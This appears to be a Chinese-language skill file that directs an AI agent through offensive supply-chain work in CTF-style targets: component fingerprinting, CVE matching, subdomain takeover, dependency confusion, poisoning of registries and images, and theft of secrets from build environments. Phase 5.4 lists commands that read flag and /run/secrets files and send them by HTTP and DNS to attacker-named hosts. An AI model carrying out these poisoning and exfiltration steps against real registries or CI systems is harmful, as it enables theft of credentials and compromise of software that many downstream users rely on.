---
name: supply-chain-audit
description: "供应链安全审计与攻击。当指纹识别发现 WordPress/Jenkins/Struts/Django 等已知框架、或发现 /package.json /composer.json /package-lock.json /Gemfile 等依赖声明文件时使用。也适用于发现 CI/CD 构建系统（Jenkins/GitLab CI/OpsFlow）、私有镜像仓库（Harbor/Nexus/Verdaccio）、或题目涉及供应链投毒/dependency confusion 场景。框架和组件版本直接关联 CVE——这是利用链的第一步，也是最容易忽略的攻击面"
metadata:
  tags: "supply-chain,component,cdn,third-party,js,npm,subdomain-takeover,供应链,组件安全,dependency-confusion,投毒,poisoning,build,pipeline,cicd,registry,harbor,nexus"
  category: "exploit"
---

# 供应链安全审计方法论

供应链攻击不需要突破目标的代码——只需要目标依赖的某个组件有漏洞或被投毒。

## ⛔ 深入参考（必读）

- 子域名接管、CDN/SRI 安全、第三方脚本风险、退役组件、风险评估矩阵 → [references/supply-chain-deep.md](references/supply-chain-deep.md)
- **主动供应链攻击**：Dependency Confusion、镜像投毒、CI/CD 注入、构建环境密钥窃取 → [references/supply-chain-attack.md](references/supply-chain-attack.md)

## Phase 1: 组件发现

### 前端 JS 库识别
```bash
katana -u http://target -silent -d 2
```
从 HTML/JS 提取：`<script src="...jquery-3.6.0.min.js">` → jQuery 3.6.0

### 后端技术栈
```bash
curl -sI http://target | grep -i "Server\|X-Powered-By\|X-AspNet"
httpx -u http://target -tech-detect -silent
```
响应头：`X-Powered-By: Express` | `Server: Apache/2.4.41` | `X-AspNet-Version`

### 子域名 → 第三方服务映射
```bash
subfinder -d target.com -silent
ksubdomain -d target.com
```
检查 CNAME：`status.target.com → statuspage.io` | `docs.target.com → gitbook.io`

## Phase 2: 已知漏洞关联

组件+版本 → CVE 匹配：
- jQuery < 3.5.0 → XSS | lodash < 4.17.21 → 命令注入
- Log4j 2.0-2.14.1 → RCE | Apache 2.4.49-2.4.50 → 路径穿越 RCE

```bash
nuclei -u http://target -severity critical,high
```

## Phase 3: 子域名接管
CNAME 指向已注销服务 → 攻击者注册 → 控制子域名内容
→ 检测方法和可接管服务列表 → [references/supply-chain-deep.md](references/supply-chain-deep.md)

## Phase 4: CDN 和外部资源
无 SRI 的 CDN 引用 = CDN 被入侵即中招
→ 详细评估方法 → [references/supply-chain-deep.md](references/supply-chain-deep.md)

## Phase 5: 主动供应链攻击（投毒）

当目标运行构建系统且使用私有包/镜像仓库时，可通过投毒获取构建环境中的 flag/密钥。

### 5.1 侦察构建环境
```bash
# 发现私有 Registry
curl -s http://registry:5000/v2/_catalog              # Docker
curl -s http://nexus:8081/service/rest/v1/search       # Nexus
curl -s http://verdaccio:4873/-/all | jq 'keys[]'     # npm

# 从构建日志/配置提取内部包名
grep -r 'npm install\|pip install\|docker pull' /build/ /ci/
```

### 5.2 Dependency Confusion
上传同名高版本包到公共/可写 Registry → 构建系统拉取攻击者的包 → install hook 执行恶意代码

### 5.3 镜像 Tag 覆盖
推送同 tag 的恶意镜像 → 下次构建拉取被毒化的 base image

### 5.4 构建环境 Flag 提取
```bash
env | grep -i flag
find / -name "flag*" 2>/dev/null
cat /run/secrets/*
# 通过 HTTP/DNS 外传
curl http://attacker/exfil -d "$(cat /flag*)"
nslookup $(cat /flag* | base64 -w0).attacker.com
```

→ 完整攻击步骤和 payload → [references/supply-chain-attack.md](references/supply-chain-attack.md)

## 注意事项
- 核心是**完整性**——漏掉一个组件就可能漏掉关键风险
- 子域名接管是最容易出成果的方向
